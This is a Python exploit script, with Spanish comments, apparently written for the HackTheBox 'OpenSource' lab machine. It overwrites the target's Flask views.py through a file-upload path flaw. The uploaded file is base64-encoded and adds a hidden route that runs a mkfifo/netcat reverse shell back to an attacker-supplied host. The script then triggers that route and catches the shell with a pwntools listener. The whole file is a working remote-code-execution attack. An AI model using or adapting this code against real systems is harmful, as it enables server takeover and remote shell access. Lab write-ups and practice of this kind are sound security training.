#!/usr/bin/python3

import requests
import argparse
import signal
import base64
import random
from pwn import *

# ==========================*
# Funciones
# ==========================*

# ---* Controlamos salida forzada mediante CTRL+C
def exit2calle(sig, frame):
    print("\nSaliendo...")
    exit(0)

signal.signal(signal.SIGINT, exit2calle)

# ---* Argumentos del programa.
def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument(dest='lhost', type=str, help='IP para generar la reverse shell')
    parse.add_argument(dest='lport', type=int, help='Puerto para generar reverse shell')
    return parse.parse_args()

# ---* Enviamos archivo malicioso.
def send_file(lhost, lport):
    p1 = log.progress("Subiendo archivo malicioso al servidor")

    file_b64_original_content = "aW1wb3J0IG9zCgpmcm9tIGFwcC51dGlscyBpbXBvcnQgZ2V0X2ZpbGVfbmFtZQpmcm9tIGZsYXNrIGltcG9ydCByZW5kZXJfdGVtcGxhdGUsIHJlcXVlc3QsIHNlbmRfZmlsZQpmcm9tIGFwcCBpbXBvcnQgYXBwCgpAYXBwLnJvdXRlKCcvJywgbWV0aG9kcz1bJ0dFVCcsICdQT1NUJ10pCmRlZiB1cGxvYWRfZmlsZSgpOgogICAgaWYgcmVxdWVzdC5tZXRob2QgPT0gJ1BPU1QnOgogICAgICAgIGYgPSByZXF1ZXN0LmZpbGVzWydmaWxlJ10KICAgICAgICBmaWxlX25hbWUgPSBnZXRfZmlsZV9uYW1lKGYuZmlsZW5hbWUpCiAgICAgICAgZmlsZV9wYXRoID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCAicHVibGljIiwgInVwbG9hZHMiLCBmaWxlX25hbWUpCiAgICAgICAgZi5zYXZlKGZpbGVfcGF0aCkKICAgICAgICByZXR1cm4gcmVuZGVyX3RlbXBsYXRlKCdzdWNjZXNzLmh0bWwnLCBmaWxlX3VybD1yZXF1ZXN0Lmhvc3RfdXJsICsgInVwbG9hZHMvIiArIGZpbGVfbmFtZSkKICAgIHJldHVybiByZW5kZXJfdGVtcGxhdGUoJ3VwbG9hZC5odG1sJykKCkBhcHAucm91dGUoJy91cGxvYWRzLzxwYXRoOnBhdGg+JykKZGVmIHNlbmRfcmVwb3J0KHBhdGgpOgogICAgcGF0aCA9IGdldF9maWxlX25hbWUocGF0aCkKICAgIHJldHVybiBzZW5kX2ZpbGUob3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLCAicHVibGljIiwgInVwbG9hZHMiLCBwYXRoKSkKCkBhcHAucm91dGUoJy9hY2Flc3RhbGFtYWdpYW9jdWx0YScpCmRlZiBtYWdpYSgpOgogICAgb3Muc3lzdGVtKCdybSAtZiAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyBBVFRBQ0tFUl9JUCBBVFRBQ0tFUl9QT1JUID4vdG1wL2YnKQogICAgcmV0dXJuICJvbGEgZW1vIGphcXVlYXUiCg=="
    file_original_content = base64.b64decode(file_b64_original_content).decode()

    p1.success("✔")
    p2 = log.progress("Ejecutando reverse shell")

    for attempt in range(2):
        file_payload_content = file_original_content.replace('ATTACKER_IP',lhost).replace('ATTACKER_PORT',str(lport))

        data_file = {'file': ('/app/app/views.py', file_payload_content, 'text/x-python')}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0'}

        # La pagina se buggea y elimina la ruta /upcloud, la subida ahora queda en /
        r = requests.post(url_site + '/upcloud', headers=headers, files=data_file)

        if r.status_code == 404:
            r = requests.post(url_site, headers=headers, files=data_file)

        # Ejecutamos reverse shell llegando a la ruta que creamos en el código
        try:
            r = requests.get(url_site + '/acaestalamagiaoculta', headers=headers, timeout=5)
        except requests.exceptions.Timeout:
            p2.success("✔")
            break
        except requests.exceptions.ConnectionError:
            pass

# ==========================*
# Variables globales
# ==========================*

url_site = "http://10.10.11.164"

# ==========================*
# Inicio del programa
# ==========================*

if __name__ == '__main__':

    banner = base64.b64decode("CuKVk+KUgOKUgOKVluKVk+KUgOKUgOKVluKVk+KUgOKUgCDilZPilZYg4pWl4pWT4pSA4pSA4pWW4pWT4pSA4pSA4pWW4pWlICDilaXilZPilIDilIDilZbilZPilIDilIAg4pWT4pSA4pSAIArilZEgIOKVkeKVkeKUgOKUgOKVnOKVkSAgIOKVkeKVkSDilZHilZnilIDilIDilZbilZEgIOKVkeKVkSAg4pWR4pWR4pSA4pSA4pWc4pWRICAg4pWRICAgCuKVqyAg4pWR4pWRICAg4pWr4pSA4pSAIOKVkeKVqyDilZHilaUgIOKVq+KVqyAg4pWR4pWrICDilZHilavilIDilIDilZbilasgICDilavilIDilIAgCuKVmeKUgOKUgOKVnOKVqCAgIOKVmeKUgOKUgOKUgOKVqOKVmeKUgOKVnOKVmeKUgOKUgOKVnOKVmeKUgOKUgOKVnOKVmeKUgOKUgOKVnOKVqCAg4pWo4pWZ4pSA4pSA4pSA4pWZ4pSA4pSA4pSA4oCiIGJ5IGxhbnoKCkhhY2tUaGVCb3gtT3BlblNvdXJjZSA6OiBQeXRob24gQ29kZSBJbmplY3Rpb24gOjogUkNFIDo6IFJldmVyc2UgU2hlbGwK").decode()
    print(banner)

    args = arguments()

    # Generamos la shell en el mismo script
    try:
        threading.Thread(target=send_file, args=(args.lhost, args.lport,)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(args.lport, timeout=10).wait_for_connection()

    if shell.sock is None:
        log.failure("La conexión no se ha obtenido. Valida IP y vuelve a intentarlo...")
        exit(1)

    shell.interactive()